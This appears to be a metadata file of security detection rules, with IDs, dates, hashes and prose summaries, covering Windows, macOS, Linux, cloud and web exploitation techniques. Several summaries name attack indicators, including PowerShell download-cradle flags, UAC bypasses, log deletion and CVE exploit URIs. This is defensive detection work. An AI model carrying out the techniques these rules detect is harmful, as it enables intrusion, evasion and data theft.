ab37a6ec-6068-432b-a64e-2c7bf95b1d22:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8d53149a814a398c35bd625fde25b0c4
  Ruleset: sigmahq
  Summary: This rule detects the execution of various scripting and command line processes,
    such as PowerShell, Wscript, Cmd, and others, that spawn a "regsvr32" instance.
    This behavior is indicative of potential misuse for bypassing application whitelisting
    mechanisms.
  Updated-Date: '2024_09_04'
ab4561b1-6c7e-48a7-ad08-087cfb9ce8f1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5515dfbe47ded15b4bce77f377273a8b
  Ruleset: core
  Summary: This rule detects instances where system auditing for significant events,
    such as "Process Creation" and "Logon" events, is disabled on a Windows system.
    It identifies changes in the audit policy where success or failure auditing for
    various security-related activities, specified by their subcategory GUIDs, is
    removed. A specific Event ID 4719 is monitored to capture these audit policy changes,
    helping to uncover potential defense evasion tactics by attackers seeking to cover
    their tracks by disabling critical auditing processes.
  Updated-Date: '2024_09_03'
ab567429-1dfb-4674-b6d2-979fd2f9d125:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9cc34eef95fdf6bba2ecd255586e8683
  Ruleset: sigmahq
  Summary: This rule detects changes to the "DisableFirstRunCustomize" value in the
    Internet Explorer registry settings. This value modifies Internet Explorer's behavior
    by preventing the browser from running the first run wizard the first time it
    is launched after installation. Monitoring these changes helps identify potential
    defense evasion activities, as malicious actors may alter this setting to avoid
    detection.
  Updated-Date: '2024_09_04'
ab6b1a39-a9ee-4ab4-b075-e83acf6e346b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b68bd6de99dc11d35e289ed5f0b4eb2d
  Ruleset: core
  Summary: This rule detects the exploitation of OMIGOD (CVE-2021-38647), a critical
    vulnerability in Open Management Infrastructure (OMI) on Azure, which allows remote
    command execution (RCE) as root through a single unauthenticated HTTP request.
    Successful exploitation can be verified by examining the HTTP client request body,
    which should contain the code execution commands. Additionally, endpoint logs
    should be checked for any suspicious commands or activities coinciding with the
    time of the HTTP request. The detection focuses on specific HTTP request criteria
    such as status code 200, URI "/wsman," and POST method, while ensuring the absence
    of an authorization header and checking for a non-zero request body length.
  Updated-Date: '2024_09_03'
ab6bffca-beff-4baa-af11-6733f296d57a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d558b7222b7103320f6f999b9297583f
  Ruleset: sigmahq
  Summary: This rule detects read access to a domain user from a non-machine account
    by monitoring EventID 4662 on Windows security logs. Specifically, it identifies
    the presence of read permissions on user objects, based on the object type `bf967aba-0de6-11d0-a285-00aa003049e2`.
    The detection logic filters out machine accounts, denoted by the `$` suffix, and
    Microsoft Online Service (MSOL) accounts, identified by the `MSOL_` prefix. Such
    read access attempts could indicate user enumeration activities, often associated
    with reconnaissance and discovery tactics used by adversaries.
  Updated-Date: '2024_09_04'
ab871450-37dc-4a3a-997f-6662aa8ae0f1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6d8eb3d916cd92233a08e1a0a4c0db9d
  Ruleset: core
  Summary: This rule detects tampering with the `MacroRuntimeScanScope` registry key,
    which is used to disable runtime scanning of enabled macros in Microsoft Office.
    This scanning is critical for identifying and mitigating potentially malicious
    macros, and disabling it can facilitate the execution of harmful activities without
    detection. The rule identifies changes to this registry key that set its value
    to disable the macro runtime scanning, signaling a potential attempt to evade
    security measures.
  Updated-Date: '2024_09_03'
ab90dab8-c7da-4010-9193-563528cfa347:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d38dc32ef1b45700e8a5daa85cc5e4e5
  Ruleset: sigmahq
  Summary: This rule detects the creation of binary files with the ".sed" extension,
    indicative of Self Extraction Directive files. These files are typically associated
    with the "iexpress.exe" utility, which is used to create self-extracting packages.
    However, attackers have been observed abusing this utility to create portable
    executable (PE) files that include embedded ".sed" entries. Notably, standard
    ".sed" files are usually simple ini configuration files rather than binary PE
    files.
  Updated-Date: '2024_09_04'
ab9e3b40-0c85-4ba1-aede-455d226fd124:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 397dc7684f4a4176cc6dbcb59f2b5f64
  Ruleset: core
  Summary: This rule detects suspicious output redirection to the local admin share
    using command line processes on Windows systems. This technique is commonly employed
    by malicious scripts or hacking tool stagers for exfiltration purposes. By identifying
    commands that attempt to redirect output to paths like '\\127.0.0.1\admin$\' or
    '\\localhost\admin$\', the rule aims to intercept potentially harmful actions
    that can compromise security.
  Updated-Date: '2024_09_03'
aba15bdd-657f-422a-bab3-ac2d2a0d6f1c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3656d57e387eab63e40b0bd45071198e
  Ruleset: sigmahq
  Summary: This rule detects the creation of .dmp or .hdmp files by shell or scripting
    applications such as cmd.exe, powershell.exe, and others. These files, often generated
    during software crashes, can contain sensitive information like credentials. It's
    crucial to identify the source of the crash when these files are created.
  Updated-Date: '2024_09_04'
aba47adc-4847-4970-95c1-61dce62a8b29:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 36908ebd095ed0cf27d5b438cc30a70f
  Ruleset: emerging-threats
  Summary: This rule detects attempts to exploit the Cisco Adaptive Security Appliance
    (ASA) and Firepower Threat Defense (FTD) systems by targeting the CVE-2020-3452
    vulnerability. It specifically monitors webserver logs for certain query strings
    in the URI and ensures the HTTP status code is 200, indicating successful exploitation.
    The rule helps identify malicious activities trying to take advantage of this
    vulnerability, potentially facilitating unauthorized access to the affected systems.
  Updated-Date: '2024_09_03'
abae8fec-57bd-4f87-aff6-6e3db989843d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7a49776d708533ebb393c50a5a7e9b4f
  Ruleset: sigmahq
  Summary: This rule detects the modification of an Amazon EC2 snapshot's permissions,
    which allows access from another AWS account. This activity can indicate potential
    exfiltration of sensitive information stored in the snapshot. The rule monitors
    events from AWS CloudTrail where the source event is from ec2.amazonaws.com and
    the event name is ModifySnapshotAttribute.
  Updated-Date: '2024_09_04'
ac175779-025a-4f12-98b0-acdaeb77ea85:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fab8f5444e9ef145d5b766ec75048ca8
  Ruleset: sigmahq
  Summary: This rule detects a suspicious command line execution that invokes PowerShell
    with a reference to an AppData folder. The rule monitors for specific patterns
    in the command line, such as the presence of 'powershell.exe', 'pwsh.exe', or
    other variants, combined with paths pointing to AppData directories like 'Local'
    or 'Roaming'. This behavior could indicate unauthorized or malicious use of PowerShell
    scripts, which are often stored and executed from the AppData directory by malware.
    This detection is intended to identify possible exploitation techniques commonly
    associated with system penetration and malware activity.
  Updated-Date: '2024_09_04'
ac1c92b4-ac81-405a-9978-4604d78cc47e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 40d5a81fcde5ba226e8e3855476069fc
  Ruleset: sigmahq
  Summary: This rule detects the execution of "VSDiagnostics.exe" with the "start"
    command, often used to launch and proxy arbitrary binaries. The process is monitored
    for specific command-line arguments such as '/launch:' or '-launch:', which indicate
    the intention to execute additional programs through "VSDiagnostics.exe". This
    activity is typically associated with defense evasion tactics, but could also
    be found in legitimate diagnostic and tracing tasks.
  Updated-Date: '2024_09_04'
ac20ae82-8758-4f38-958e-b44a3140ca88:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8d0e202b025991bd6b04829c0cfaf35b
  Ruleset: core
  Summary: This rule detects the use of obfuscated PowerShell scripts employing MSHTA,
    a legitimate Windows utility for executing HTML-based applications, within script
    executions. Malicious actors leverage this technique for defense evasion and execution
    tactics, often using command lines that contain specific patterns indicative of
    this behavior, such as 'set', '&&', 'mshta', 'vbscript:createobject', '.run',
    and '(window.close)'. This behavior aligns with known methods of executing obfuscated
    code to bypass security measures.
  Updated-Date: '2024_09_03'
ac5a6409-8c89-44c2-8d64-668c29a2d756:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c1824a8c6bd68bf3e114873d80ce1a4e
  Ruleset: emerging-threats
  Summary: This rule detects exploitation attempts targeting Citrix Netscaler, Application
    Delivery Controller, and Citrix Gateway, specifically for CVE-2019-19781. This
    vulnerability allows attackers to perform directory traversal attacks and execute
    arbitrary code on the targeted system. The detection includes checks for specific
    patterns in the URL queries that indicate attempts to exploit vulnerable scripts
    within the vpns/portal directory.
  Updated-Date: '2024_09_03'
ac8866c7-ce44-46fd-8c17-b24acff96ca8:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d14694c283604df670e7a58c43833d3d
  Ruleset: core
  Summary: This rule detects the installation of the Azure Hybrid Connection Manager
    service, which enables remote code execution from an Azure function. The detection
    focuses on registry events related to the creation of the service and the setting
    of values associated with 'Microsoft.HybridConnectionManager.Listener.exe' in
    the Windows registry.
  Updated-Date: '2024_09_03'
ac9159cc-c364-4304-8f0a-d63fc1a0aabb:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fba090834309bd9f101dce746385a159
  Ruleset: sigmahq
  Summary: This rule detects changes to the ClickOnce trust prompt registry key to
    facilitate installations from various locations, including the Internet. ClickOnce
    is a Microsoft technology used for deploying Windows applications. The rule monitors
    specific registry paths associated with the .NET Framework's TrustManager to identify
    when the trust prompt behavior is altered, potentially enabling unauthorized or
    harmful code execution.
  Updated-Date: '2024_09_04'
acd74772-5f88-45c7-956b-6a7b36c294d2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bc63484ca52bb16f4adb442cce07a213
  Ruleset: sigmahq
  Summary: This rule detects the deletion of the Security Descriptor (SD) value in
    the \Schedule\TaskCache\Tree registry hive on Windows systems, which is a technique
    used by the Tarrask malware to hide scheduled tasks. This action helps the malware
    evade defense mechanisms by making the schedule tasks less visible or harder to
    detect.
  Updated-Date: '2024_09_04'
ace3ff54-e7fd-46bd-8ea0-74b49a0aca1d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ffbd4621eaf313aa627208786fda0ded
  Ruleset: core
  Summary: This rule detects remote RPC calls that are used to create or execute a
    scheduled task, which can indicate lateral movement across a network. The specific
    RPC interface identified by the UUID `86d35949-83c9-4044-b424-db363231fd0c` relates
    to the ITaskSchedulerService used for managing scheduled tasks. The detection
    focuses on certain operation numbers that correspond to actions like creating
    and executing tasks. This activity can be indicative of an attempt to expand access
    and execute tasks on remote systems, presenting a potential security risk associated
    with lateral movement techniques.
  Updated-Date: '2024_09_03'
acf61bd8-d814-4272-81f0-a7a269aa69aa:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 043449d3edfd62d1b041785f7073faeb
  Ruleset: sigmahq
  Summary: This rule detects attempts to delete local audit logs on macOS systems
    by monitoring for the execution of commands commonly used to remove files, such
    as '/rm', '/unlink', and '/shred'. It looks for command lines that target specific
    log directories like '/var/log' and user-specific log paths within '/Users/' and
    '/Library/Logs/'. This detection is important for identifying potential indicator
    removal activities, which may be indicative of malicious attempts to cover tracks
    on a compromised host.
  Updated-Date: '2024_09_04'
ad0960eb-0015-4d16-be13-b3d9f18f1342:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b1d96a70d1aaf928b26b271ad6d246bc
  Ruleset: emerging-threats
  Summary: This rule detects the creation of a file named "wermgr.exe" in an uncommon
    directory, which could indicate the exploitation of CVE-2023-36874.
  Updated-Date: '2024_09_03'
ad1f4bb9-8dfb-4765-adb6-2a7cfb6c0f94:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: aea909a96db8f05858cb6874d4ea0d8e
  Ruleset: sigmahq
  Summary: This rule detects suspicious image loads of the WSMAN provider, specifically
    targeting the loading of `WsmSvc.dll`, `WsmAuto.dll`, and `Microsoft.WSMan.Management.ni.dll`
    from both common and uncommon processes. It differentiates between normal and
    potentially malicious use by examining images loaded by system processes such
    as `svchost.exe` and other specified executables, and excludes common legitimate
    processes like `powershell.exe`, `services.exe`, and various standard system and
    application paths. The rule aims to identify unusual activities that may indicate
    the use of Windows Remote Management (WinRM) for lateral movement or unauthorized
    remote command execution.
  Updated-Date: '2024_09_04'
ad691d92-15f2-4181-9aa4-723c74f9ddc3:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e4b7234c36cd3488d1fe6ce18f6bff0f
  Ruleset: core
  Summary: This rule detects the presence of the Unicode character "\u202e", which
    prompts text to be rendered in a right-to-left sequence in terminals, browsers,
    or operating systems. This technique is often employed for obfuscation and masquerading
    by malicious actors.
  Updated-Date: '2024_09_03'
ad7085ac-92e4-4b76-8ce2-276d2c0e68ef:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8223d62a740bb8f7a263a29bd7a03c77
  Ruleset: emerging-threats
  Summary: This rule detects the exploitation patterns associated with Windows vulnerabilities
    CVE-2021-31979 and CVE-2021-33771, as well as activities related to the DevilsTongue
    malware by the threat group Sourgum. It monitors specific file paths and filenames
    within the Windows system directories that are indicative of these exploits and
    malware actions. The specified files include system-critical files and configuration
    data files which, if altered or accessed, may signify attempts to leverage these
    particular vulnerabilities for malicious purposes.
  Updated-Date: '2024_09_03'
ad720b90-25ad-43ff-9b5e-5c841facc8e5:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a7aaf15ba29cd9507745aedcd5a1c1be
  Ruleset: sigmahq
  Summary: This rule detects the addition of users to the local administrator group
    on Windows systems. It specifically monitors process creation events where the
    command line contains patterns indicating the use of "net.exe" or "Add-LocalGroupMember"
    cmdlets. These commands can be used to escalate privileges by adding users to
    the local administrators' group, which could indicate a potential persistence
    mechanism or unauthorized administrative access.
  Updated-Date: '2024_09_04'
ad87d14e-7599-4633-ba81-aeb60cfe8cd6:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 35e31ed3ee519329cc8212b222d82093
  Ruleset: sigmahq
  Summary: This rule detects when an Azure application gateway is modified or deleted.
    It monitors activities where the operations "MICROSOFT.NETWORK/APPLICATIONGATEWAYS/WRITE"
    or "MICROSOFT.NETWORK/APPLICATIONGATEWAYS/DELETE" occur within Azure's activity
    logs. This helps identify potentially unauthorized changes to the application
    gateway, which may indicate a security incident. System administrators may perform
    these operations as part of routine maintenance; however, changes initiated by
    unfamiliar users should be investigated for legitimacy.
  Updated-Date: '2024_09_04'
ad89044a-8f49-4673-9a55-cbd88a1b374f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: dfe3c4761e2f0422c71a8cf93fe9051a
  Ruleset: sigmahq
  Summary: This rule detects the setting and configuration of specific environment
    variables associated with the .NET Framework CLR and .NET Core CLR profiling functionality,
    such as "COR_ENABLE_PROFILING" and "COR_PROFILER." These variables are used to
    enable and direct the behavior of profiling tools, which can be leveraged for
    persistence, privilege escalation, and defense evasion within a Windows environment.
    Detection focuses on registry modifications where these environment variables
    are set.
  Updated-Date: '2024_09_04'
ad9012a6-e518-4432-9890-f3b82b8fc71f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 43a522fd92c2011521729b37fd1cb3e8
  Ruleset: sigmahq
  Summary: This rule detects attempts to inject a sidecar container into a running
    deployment within a Kubernetes environment. A sidecar container operates alongside
    the main container in a pod, and adding it to existing resources such as Deployments,
    DaemonSets, or StatefulSets can be achieved through a "kubectl patch" operation.
    By doing this, an attacker can inconspicuously run their code within a legitimate
    pod, rather than deploying a separate pod, thus concealing their malicious activity.
  Updated-Date: '2024_09_04'
ad92e3f9-7eb6-460e-96b1-582b0ccbb980:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4a7d55ccad3d5c00c2862f7dd8e1325b
  Ruleset: core
  Summary: This rule detects a User Account Control (UAC) bypass attempt using a modification
    of the Microsoft System Configuration (msconfig.exe) tool. The specific technique
    observed is related to a known UACMe 55 exploit, involving the process "pkgmgr.exe"
    from the temporary directory executing "msconfig.exe" with a "-5" flag. This indicates
    that an unauthorized process is trying to elevate privileges by manipulating the
    User Account Control settings through this specific exploit method.
  Updated-Date: '2024_09_03'
ada3bc4f-f0fd-42b9-ba91-e105e8af7342:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6a746eb70fec4f235dd12dd36018f998
  Ruleset: core
  Summary: This rule detects attempts of Server Side Template Injection (SSTI) through
    GET requests in web server access logs. It identifies specific strings commonly
    associated with SSTI attacks, indicating possible injection activities. The rule
    filters out occurrences where the server returns a 404 status code to reduce false
    positives, especially those caused by user searches or internal vulnerability
    scanners. Notable SSTI payloads or markers it looks for include patterns such
    as '={{', '=%7B%7B', freemarker templates, and specific Java class loading commands.
    This detection aims to identify and mitigate potential exploitation attempts targeting
    web applications.
  Updated-Date: '2024_09_03'
ada4b0c4-758b-46ac-9033-9004613a150d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ba51f9c56106089a817d9761bbaed59f
  Ruleset: sigmahq
  Summary: This rule detects modifications to Group Policy settings on Windows systems,
    which could indicate malicious activity aimed at implementing other harmful behaviors.
    It specifically looks for the execution of 'reg.exe' with command line arguments
    related to modifying significant Group Policy settings such as GroupPolicyRefreshTime,
    GroupPolicyRefreshTimeOffset, and SmartScreen configurations. This can be an indicator
    of attempts to bypass security measures or escalate privileges.
  Updated-Date: '2024_09_04'
add64136-62e5-48ea-807e-88638d02df1e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b2f817f411be423183560edd0c722569
  Ruleset: core
  Summary: This rule detects suspicious invocations of the `fsutil` utility on Windows
    systems, particularly those involving parameters such as `deletejournal`, `createjournal`,
    and `setZeroData`. These parameters can be indicative of malicious activity like
    ransomware attacks, seen with threats such as NotPetya, as they involve activities
    like deleting USN journals, configuring journals with minimal sizes, or emptying
    files by overwriting them with zeros. Detection occurs when these specific commands
    are executed, which could suggest an attempt to evade defenses or cause impact
    on the system integrity.
  Updated-Date: '2024_09_03'
adf876b3-f1f8-4aa9-a4e4-a64106feec06:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 250e488b35f504b63f94cd031c1dd2c6
  Ruleset: sigmahq
  Summary: This rule detects the usage of uncommonly used ports for communicating
    over protocols that are not typically associated with those ports. Specifically,
    it monitors for instances where PowerShell scripts utilize the Test-NetConnection
    cmdlet to connect to ports other than the traditional ones for certain protocols,
    such as using port 8088 or 587 for HTTPS instead of the standard port 443. This
    behavior may indicate adversarial activity aiming to evade detection.
  Updated-Date: '2024_09_04'
adf9f4d2-559e-4f5c-95be-c28dff0b1476:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b24eae61aeb030982d0ecf4c170f98e1
  Ruleset: core
  Summary: This rule detects sign-ins from new countries by analyzing past activity
    locations to identify new and infrequent locations. It focuses on unusual or unexpected
    geographic login patterns, aiming to spot potential unauthorized access attempts.
  Updated-Date: '2024_09_03'
ae02ed70-11aa-4a22-b397-c0d0e8f6ea99:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6bbd9d64d77c57bda63bb811c8437a88
  Ruleset: sigmahq
  Summary: This rule detects the download of suspicious file types from well-known
    file and paste sharing domains on Windows systems. It specifically monitors for
    downloads that contain domains such as githubusercontent.com, anonfiles.com, mediafire.com,
    and pastebin.com, among others. The rule focuses on files with certain extensions,
    particularly those associated with batch scripts ('.bat:Zone'), command scripts
    ('.cmd:Zone'), and PowerShell scripts ('.ps1:Zone'). This detection seeks to identify
    potential threats related to unauthorized or harmful file downloads that may be
    used in various attack methods such as defense evasion.
  Updated-Date: '2024_09_04'
ae215552-081e-44c7-805f-be16f975c8a2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cf85ccb26540f9cd3b486c7d6bc5df35
  Ruleset: core
  Summary: This rule detects the registration of a debugger through command line operations
    for specific programs that are accessible from the Windows logon screen, which
    can indicate a sticky key backdoor. The targeted programs include commonly exploited
    accessibility tools such as sethc.exe, utilman.exe, osk.exe, magnify.exe, narrator.exe,
    displayswitch.exe, atbroker.exe, and HelpPane.exe. Detecting such actions is crucial
    for identifying potential persistence or privilege escalation tactics on Windows
    systems.
  Updated-Date: '2024_09_03'
ae2bdd58-0681-48ac-be7f-58ab4e593458:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 52851b1dee2ccb6c6f9ce2b63ac579a3
  Ruleset: core
  Summary: This rule detects attempts to tamper with the Windows Defender configuration
    by monitoring for the use of the 'Remove-MpPreference' cmdlet via PowerShell Script
    Block Logging. It specifically looks for command strings that indicate potential
    modification of protection settings, including controlled folder access, attack
    surface reduction rules, and signature check configurations before running scans.
    The detection is likely to trigger on both malicious activities and legitimate
    administrative scripts altering these settings.
  Updated-Date: '2024_09_03'
ae48ab93-45f7-4051-9dfe-5d30a3f78e33:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5d46b7f9d6e56578d70851795178cf93
  Ruleset: sigmahq
  Summary: This rule detects suspicious Spring framework exceptions that could indicate
    exploitation attempts. It monitors application logs for specific exception keywords
    such as AccessDeniedException, CsrfException, InvalidCsrfTokenException, MissingCsrfTokenException,
    CookieTheftException, InvalidCookieException, and RequestRejectedException. These
    exceptions could potentially signify unauthorized access attempts or other security-related
    issues within applications using the Spring framework.
  Updated-Date: '2024_09_04'
ae6f14e6-14de-45b0-9f44-c0986f50dc89:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f3b23d306e6f8ebf3fbcac08ffa14cbd
  Ruleset: core
  Summary: This rule detects when a program changes the default file association of
    any extension to an executable. File associations determine which program opens
    a file based on its extension and are stored in the Windows Registry. These associations
    can be edited by users, administrators, or programs with Registry access, and
    by using the built-in 'assoc' utility. Unauthorized changes to file associations
    could indicate malicious activity, such as a program attempting to run an arbitrary
    executable when a specific file type is opened.
  Updated-Date: '2024_09_03'
ae7fbf8e-f3cb-49fd-8db4-5f3bed522c71:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0f4d065b5e68bc59a51414820baed8b5
  Ruleset: core
  Summary: 'This rule detects suspicious PowerShell invocations by identifying specific
    command parameters that are commonly used in malicious activities. These indicators
    include script block texts containing: `-nop`, `-w`, `hidden`, `-c`, and methods
    for converting strings from Base64 format; indicators of `iex` execution with
    command-line flags like `-w`, `hidden`, `-noni`, `-nop`, and the creation of new
    objects; instances where the `-ep bypass` and `-Enc` parameters are used to execute
    encoded commands; registry modifications to auto-run a PowerShell script; and
    the use of a WebClient to download potentially harmful content with arguments
    such as `bypass`, `-noprofile`, `-windowstyle`, and `hidden`. Additionally, the
    rule identifies potentially harmful downloads executed via WebClient and invocation
    of `iex` with new object creation from a Net.WebClient instance. Specific known
    benign strings related to Chocolatey installation scripts are filtered out to
    reduce false positives.'
  Updated-Date: '2024_09_03'
ae94b10d-fee9-4767-82bb-439b309d5a27:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fd4be88bc3831487bec05a7fab2314ca
  Ruleset: emerging-threats
  Summary: This rule detects corrupted packets encountered by the Microsoft Message
    Queuing (MSMQ) service, identified by Event ID 2027 with a critical alert level.
    The presence of these corrupted packets could indicate an attempt to exploit CVE-2023-21554,
    a known vulnerability in MSMQ that may compromise system security.
  Updated-Date: '2024_09_03'
ae9b0bd7-8888-4606-b444-0ed7410cb728:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9df2e92197915fb43c7ef92ba8664b51
  Ruleset: sigmahq
  Summary: This rule detects the creation or manipulation of potentially malicious
    files in the C:\Windows\Fonts\ folder on Windows systems. This folder is notable
    because it does not require administrative privileges for files to be written
    and executed, making it a convenient location for attackers to hide malicious
    files. The rule monitors specific command-line activities associated with file
    operations, such as 'echo', 'copy', and 'type', alongside the presence of file
    types such as .exe, .dll, .bat, and several other executable or script extensions.
    Detecting these activities helps in identifying attempts to evade defenses and
    establish persistence on the affected system.
  Updated-Date: '2024_09_04'
ae9c6a7c-9521-42a6-915e-5aaa8689d529:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0c4b99a514dcf9aaa8f73f1bcb7e5c54
  Ruleset: core
  Summary: This rule detects the use of Rundll32 by Cobalt Strike to load dynamic-link
    libraries (DLLs) via the StartW function from the command line. The rule focuses
    on identifying instances where Rundll32 is invoked with specific command-line
    parameters that suggest malicious activity associated with loading and executing
    DLL files using the StartW method. Such behavior is typically indicative of defense
    evasion tactics common to Cobalt Strike, a legitimate penetration testing tool
    that is often abused by threat actors for malicious purposes.
  Updated-Date: '2024_09_03'
ae9d710f-dcd1-4f75-a0a5-93a73b5dda0e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b338889e7fafd2a7fb35d514e52dddf9
  Ruleset: sigmahq
  Summary: This rule detects the execution of programs as Launch Agents or Launch
    Daemons using launchctl on macOS. The rule identifies specific command line parameters
    such as 'submit', 'load', and 'start' being used with the launchctl binary. It
    is designed to monitor process creation events to capture instances where launchctl
    is invoked in a manner that may indicate the setup or operation of persistence
    mechanisms. False positives may occur due to legitimate administrative activities,
    hence it is important to scrutinize the associated command lines to assess whether
    the triggered event is suspicious.
  Updated-Date: '2024_09_04'
aeab5ec5-be14-471a-80e8-e344418305c2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1ee0265cf4648d67490e81e22b5e9468
  Ruleset: emerging-threats
  Summary: This rule detects the execution of executables often associated with PlugX
    malware for DLL side loading when they are run from uncommon locations. It monitors
    for specific executable files, including CamMute.exe, chrome_frame_helper.exe,
    dvcemumanager.exe, Gadget.exe, hcc.exe, hkcmd.exe, Mc.exe, MsMpEng.exe, msseces.exe,
    OInfoP11.exe, OleView.exe, and rc.exe. The rule identifies these files' typical
    valid paths and flags them if they are executed outside these expected directories,
    which might indicate malicious activity. PlugX is a remote access Trojan known
    for its use in cyber espionage, often leveraging DLL side loading to evade detection.
  Updated-Date: '2024_09_03'
aeaef14c-e5bf-4690-a9c8-835caad458bd:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ef7f743ea7db841d6ec6e217d322db68
  Ruleset: core
  Summary: This rule detects when Privileged Identity Management (PIM) alerts are
    set to disabled in Azure environments. The detection focuses on audit logs generated
    by Azure services, specifically examining log entries where the message indicates
    the disabling of PIM alerts. This activity is significant as it may indicate persistence
    mechanisms or privilege escalation attempts within the Azure ecosystem.
  Updated-Date: '2024_09_03'
aee7681f-b53d-4594-a9de-ac51e6ad3362:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d7101bd18daba5435f956d265f64a3a1
  Ruleset: emerging-threats
  Summary: This rule detects exploitation attempts of CVE-2023-4966, a sensitive information
    disclosure vulnerability in Citrix ADC and NetScaler Gateway. It identifies these
    attempts through proxy logs by looking for a very long host header string, specifically
    targeting the URI '/oauth/idp/.well-known/openid-configuration' with a 'GET' method.
    The vulnerability could potentially expose session tokens and other sensitive
    data, leading to unauthorized access if exploited.
  Updated-Date: '2024_09_03'
aef9d1f1-7396-4e92-a927-4567c7a495c1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c944806ecca4221f47fd353be2c85d8e
  Ruleset: sigmahq
  Summary: This rule detects the execution of the Git command used to clone a remote
    repository if the command contains certain suspicious keywords. These keywords
    may indicate potentially dangerous content such as exploits, vulnerabilities,
    or proof-of-concept (PoC) code related to specific exploits like 'proxyshell',
    'log4shell', and 'eternalblue'. The rule monitors for the use of 'git.exe' or
    'git-remote-https.exe' and checks the command line for these keywords to identify
    activities that may pose a security risk.
  Updated-Date: '2024_09_04'
af1ac430-df6b-4b38-b976-0b52f07a0252:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 77edcd4b8dd9f4eb8d8b80673b72521b
  Ruleset: sigmahq
  Summary: This rule detects instances where an HTTP service on an OpenCanary node
    has experienced a login attempt via a Form POST.
  Updated-Date: '2024_09_04'
af202fd3-7bff-4212-a25a-fb34606cfcbe:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d7e7bc0a3f47f19bc064fd7a412eee83
  Ruleset: sigmahq
  Summary: This rule detects the suspicious modification of the crontab file on Linux
    systems. The crontab file is crucial for scheduling jobs and automating tasks,
    and unauthorized changes to it could indicate a persistence mechanism by an attacker.
    By monitoring for specific keywords associated with modifications, this rule aims
    to identify potentially malicious activity that could compromise system integrity.
    Although legitimate modifications by users or administrators can occur, the aim
    is to flag unexpected changes, which might signal an intrusion attempt aimed at
